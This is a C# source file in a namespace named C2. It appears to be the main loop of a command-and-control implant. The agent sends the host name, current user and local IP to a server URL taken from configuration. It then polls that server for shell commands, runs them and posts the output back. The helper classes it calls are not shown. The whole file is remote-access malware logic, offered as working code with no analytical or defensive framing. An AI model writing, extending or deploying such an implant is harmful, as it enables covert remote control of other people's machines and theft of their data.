using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;

namespace C2
{
    class Program
    {
        static void Main(string[] args)
        {
 
            string agentName = Config.GetAgentName();
            string ShellResults = "";
            string agentDetails = agentName + "|" + Function.GetHostName() + "|" + Function.GetWhoami() + "|" + Function.GetLocalIP();
            while (true)
            {
                string InitResults = Http.PostResults(agentDetails, Config.Url + Config.InitUrl + agentName);
                if (ShellResults == null && !String.Equals(InitResults, "ok"))
                {
                    Thread.Sleep(Config.Sleep);
                    continue;
                }
                while (true)
                {
                    ShellResults = Http.GetRequest(Config.Url + Config.ShellUrl + agentName);
                    if (String.Equals(ShellResults, "error"))
                    {
                        break;
                    }
                    if (ShellResults != null && ShellResults.Length > 0)
                    {
                        string[] Command = ShellResults.Split(' ');
                        string results = Function.Run(Command);
                        Http.PostResults(results, Config.Url + Config.PostResults + agentName);
                    }
                    Thread.Sleep(Config.Sleep);
                }

            }
        }

    }
}
